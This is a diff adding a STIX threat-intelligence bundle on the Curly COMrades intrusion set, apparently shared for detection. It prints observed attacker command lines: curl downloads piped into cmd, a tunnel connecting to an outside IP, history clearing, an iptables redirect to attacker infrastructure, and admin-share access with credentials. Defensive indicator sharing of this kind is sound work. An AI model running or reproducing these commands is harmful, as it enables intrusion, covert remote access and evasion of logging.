@@ -1,0 +1,389 @@
+{
+  "type": "bundle",
+  "id": "bundle--69eb892b-5996-4acc-92dc-112e49d56f3f",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "process",
+      "id": "process--b319bff3-12e0-4741-aefa-0890b758b016",
+      "command_line": "cmd.exe /C echo curl.exe http://<redacted>.md | cmd > c:\\Programdata\\WindowsUpdateTask_H.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--2e7ff525-4d01-402e-95ca-55ef9c28a7d7",
+      "command_line": "cmd.exe /C echo curl.exe http://<redacted>.md/about.mp4 -o c:\\programdata\\1.rar | cmd > c:\\Programdata\\WindowsUpdateTask_D.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--50183eb6-a25a-45af-892f-dd8becdfb8a9",
+      "command_line": "cmd.exe /C dir \"c:\\program Files\" > c:\\Programdata\\WindowsUpdateTask_X.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--7513feb4-c046-48d9-b14d-5372127dbbb2",
+      "command_line": "cmd.exe /C \"c:\\program files\\WinRAR\\rar.exe\" x c:\\programdata\\1.rar c:\\programdata\\microsoft\\AppV\\app > c:\\Programdata\\WindowsUpdateTask_z.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--05aee989-b3b8-43fb-9ab3-2bdd8ef00ba2",
+      "command_line": "cmd.exe /C powershell.exe -c import-vm -path \"c:\\programdata\\microsoft\\AppV\\app\\Virtual Machines\\1DBCC80B-5803-4AF1-8772-712C688F408A.vmcx\" -Copy -GenerateNewId > c:\\Programdata\\WindowsUpdateTask_t.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--0cac37bb-f3a6-4000-8325-977b071c7a04",
+      "command_line": "cmd.exe /C powershell.exe -c Start-VM -name WSL > c:\\Programdata\\WindowsUpdateTask_R.tmp 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--13cc4a14-cbbe-4f31-859c-be5fd4704838",
+      "command_line": "dism /online /disable-feature /FeatureName:microsoft-hyper-v-Management-clients /norestart"
+    },
+    {
+      "type": "process",
+      "id": "process--c2c7c2ea-8d3b-4ff6-90e1-09c635d12497",
+      "command_line": "dism /online /enable-feature /All /LimitAccess /FeatureName:microsoft-hyper-v /norestart"
+    },
+    {
+      "type": "process",
+      "id": "process--63e9f0d6-b2fb-4263-9446-0158ca93fc7d",
+      "command_line": "cmd.exe /C C:\\Windows\\ps1\\utc.exe 45.43.91.10:443 --key <redacted> > C:\\Programdata\\regid_1992 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--2803bb57-afcd-4773-aee3-d6f476ae4238",
+      "command_line": "cmd.exe /C curl http://45.43.91.10:443 > C:\\Programdata\\regid_1992 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--db4377b1-7634-455c-8f08-14204c136b14",
+      "command_line": "cmd.exe /C curl ipinfo.io > C:\\Programdata\\regid_1992 2>&1"
+    },
+    {
+      "type": "process",
+      "id": "process--72fcaa76-bee6-43a0-9eab-2d2314b17b7d",
+      "command_line": "sshd -p 31637"
+    },
+    {
+      "type": "process",
+      "id": "process--8839bdca-386e-48e7-a44e-dc89b9e6dc19",
+      "command_line": "unset HISTFILE"
+    },
+    {
+      "type": "process",
+      "id": "process--a94e523c-a19d-45a1-88ad-52c8f5a4861a",
+      "command_line": "iptables -t nat -A PREROUTING -p tcp --dport 443 -s <victim_ip> -j DNAT --to-destination 88.198.91.116:22"
+    },
+    {
+      "type": "process",
+      "id": "process--f1790bd2-3e90-4e02-bb4b-b10bc84a027b",
+      "command_line": "klist purge"
+    },
+    {
+      "type": "process",
+      "id": "process--75d216df-ffaf-47d0-abed-22c34127d75d",
+      "command_line": "net use \\\\<redacted>\\C$ /user:<username> <password>"
+    },
+    {
+      "type": "process",
+      "id": "process--618d8dd4-c265-48c4-b4e7-c1afb9f2d4c4",
+      "command_line": "dir \\\\<redacted>\\C$\\users"
+    },
+    {
+      "type": "process",
+      "id": "process--2ee2d65a-85ee-40bf-97f7-d8aba7a4d491",
+      "command_line": "net use /delete \\\\<redacted>\\C$"
+    },
+    {
+      "type": "directory",
+      "id": "directory--6c4a9c26-68e9-431e-b701-eb771ae37195",
+      "path": "c:\\programdata\\microsoft\\AppV\\app"
+    },
+    {
+      "type": "directory",
+      "id": "directory--2713eb6c-1be4-463c-94fe-57bf5c0c5d62",
+      "path": "c:\\Windows\\ps1"
+    },
+    {
+      "type": "directory",
+      "id": "directory--bd4942fa-9ed2-42ce-8732-e7f818ffe9d4",
+      "path": "/root/.ssh"
+    },
+    {
+      "type": "directory",
+      "id": "directory--7cc4a6f9-2c0d-4e2d-9c6f-37f42951e251",
+      "path": "/etc"
+    },
+    {
+      "type": "directory",
+      "id": "directory--a4710686-7cd5-4634-aa67-45a02e1fe58a",
+      "path": "/bin"
+    },
+    {
+      "type": "directory",
+      "id": "directory--cfdfae26-085d-4189-8766-a23ad516e2ff",
+      "path": "/root"
+    },
+    {
+      "type": "directory",
+      "id": "directory--2619d379-cb56-4bd1-b595-439d28efce7e",
+      "path": "/etc/crontabs"
+    },
+    {
+      "type": "directory",
+      "id": "directory--842c8627-4eb5-44ad-97df-3d664decde70",
+      "path": "/etc/hosts"
+    },
+    {
+      "type": "directory",
+      "id": "directory--a4b8178e-3ce5-4383-8bd8-9dfa803d97c1",
+      "path": "/etc/resolv.conf"
+    },
+    {
+      "type": "directory",
+      "id": "directory--24f55f5e-1188-4d58-a89d-dddca6b7570a",
+      "path": "c:\\program files\\WinRAR"
+    },
+    {
+      "type": "directory",
+      "id": "directory--279024a0-7ea9-4321-9ca6-49427e769699",
+      "path": "\\\\<domain>\\NETLOGON\\GPO test\\Scripts"
+    },
+    {
+      "type": "software",
+      "id": "software--d16cb533-b4e5-44fb-adca-98130f16e22b",
+      "name": "CurlyShell",
+      "cpe": "NONE",
+      "languages": [
+        "C++"
+      ],
+      "description": "Custom reverse shell built on libcurl"
+    },
+    {
+      "type": "software",
+      "id": "software--57583ee4-bb97-4e85-8a29-5ac884dffc5f",
+      "name": "CurlCat",
+      "cpe": "NONE",
+      "languages": [
+        "C++"
+      ],
+      "description": "Custom reverse proxy/tunnel built on libcurl"
+    },
+    {
+      "type": "software",
+      "id": "software--f4bd07b4-09d6-4d00-a7da-bfd949401f3c",
+      "name": "WinRAR",
+      "cpe": "NONE",
+      "description": "Used for extracting malicious archives"
+    },
+    {
+      "type": "software",
+      "id": "software--fea3b60f-1483-4663-a422-860907eaa3d5",
+      "name": "curl",
+      "cpe": "NONE",
+      "description": "Used for downloading files"
+    },
+    {
+      "type": "software",
+      "id": "software--4bddbe63-484b-41a2-a65b-94f2fa4cf021",
+      "name": "PowerShell",
+      "cpe": "NONE",
+      "description": "Used for remote command execution and persistence scripts"
+    },
+    {
+      "type": "software",
+      "id": "software--9aa8438c-6dd6-4831-bd55-2f834d3ce78e",
+      "name": "Hyper-V",
+      "cpe": "NONE",
+      "description": "Windows virtualization platform abused for VM deployment"
+    },
+    {
+      "type": "software",
+      "id": "software--11c1d9a1-395b-41ac-aa04-177e207a0710",
+      "name": "Alpine Linux",
+      "cpe": "NONE",
+      "description": "Minimal Linux OS used in attacker VM"
+    },
+    {
+      "type": "software",
+      "id": "software--eb3f78fd-ecb9-4b41-8669-9669121d5a32",
+      "name": "sshd",
+      "cpe": "NONE",
+      "description": "SSH daemon manually started on compromised server"
+    },
+    {
+      "type": "software",
+      "id": "software--f8cddb3c-724b-402a-a2e9-07a79d4ca10b",
+      "name": "iptables",
+      "cpe": "NONE",
+      "description": "Used to redirect traffic from victim to attacker infrastructure"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--64630791-a5aa-484d-8f48-fc3343734e27",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades deployed CurlyShell as a persistent reverse shell in victim environments."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--7d2d3e89-2a9f-4bb6-af0c-59e4b27b1e5b",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used CurlCat for SSH reverse proxy tunneling and covert network access."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f4587ea2-fd6e-40ae-a512-3dc2d87047b8",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used Resocks proxy/tunneling tool to sustain access and enable flexible network tunneling."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--01b45c3e-48e5-4ffb-9acd-21bc28b51f8c",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used Rsockstun tunneling tool for network proxying and persistence."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--be631587-bc70-4c75-b1fb-5b97ed10632f",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used Ligolo-ng tunneling tool for flexible proxy access."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--cb08a270-c486-4f5e-9d34-f77a05a6cf93",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used CCProxy to maintain network access and tunneling capabilities."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e4f90279-2846-42d4-be1a-088cf87f61fb",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used Stunnel for encrypted tunneling as part of their layered proxy approach."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--de1b4e17-320e-4083-bbd6-34b71317a93b",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used a customized PowerShell Kerberos Ticket Injector for credential access and lateral movement."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--93582b63-e775-4ae7-a616-eb05bb5b7056",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "Curly COMrades used PowerShell Local Account Persistence Script to create or reset local user accounts for persistence."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4d1abb5e-e49d-48c9-90fe-293a01520d8b",
+      "relationship_type": "delivers",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "CurlyShell is delivered as an ELF binary located at /bin/init_tools."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--90347e78-ccac-491c-9666-0c618021f39b",
+      "relationship_type": "delivers",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "CurlCat is delivered as an ELF binary located at /root/updater."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b8fc6c6d-cfda-4cf3-9066-79f03f8fe490",
+      "relationship_type": "delivers",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "PowerShell Kerberos Ticket Injector is delivered as kb_upd.ps1 at c:\\programdata\\kb_upd.ps1."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f0ce1f31-5e19-46c1-b5f4-07564b858878",
+      "relationship_type": "delivers",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "PowerShell Local Account Persistence Script is delivered as screensaver.ps1, locals.ps1, and Localps.ps1."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--16b86866-8a30-4f3c-8574-579241501866",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "CurlyShell uses the init_tools file for persistent reverse shell execution."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--954a4a17-1d52-4cc8-a79e-6b4b3540bf69",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "CurlyShell uses alpine_init script for persistence via crontab."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--ae6e7a25-5474-4a5d-ae8b-8ba0c3befcb5",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "file--3ca7f096-735d-431e-8de7-57cfb9673e0e",
+      "description": "CurlCat uses id_rsa private key for SSH authentication to remote C2 infrastructure."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b3a4282b-7e92-446c-95ba-cacba5afbe3c",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "user-account--c9ee6409-aa2a-40a1-a208-e08bc3caec67",
+      "description": "CurlCat authenticates to remote C2 infrastructure using the 'bob' SSH account."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--70b169a0-6e5c-45e3-8c60-053ad7da2fa6",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "user-account--c9ee6409-aa2a-40a1-a208-e08bc3caec67",
+      "description": "PowerShell Local Account Persistence Script creates or resets the 'camera' local user account for persistence."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--1c143f81-51a4-45d8-a355-dcac7fa4e48a",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "tool--51ac75a6-b1a0-4023-847f-0da9a525771a",
+      "description": "Curly COMrades used WinRAR to extract virtual machine files from downloaded archives."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e4494b44-7761-42fa-83ec-41eb2a5172be",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--108baa47-95cf-409f-ba76-07392e48d497",
+      "target_ref": "tool--51ac75a6-b1a0-4023-847f-0da9a525771a",
+      "description": "Curly COMrades used curl.exe for downloading payloads and performing connectivity checks."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--752e1d42-7617-4d70-bacb-2bb34ef31ba6",
+      "relationship_type": "uses",
+      "source_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "target_ref": "malware--84bba7be-eec4-45e4-86ed-b023dfa07556",
+      "description": "CurlyShell can initiate CurlCat for proxy access when needed."
+    }
+  ]
+}
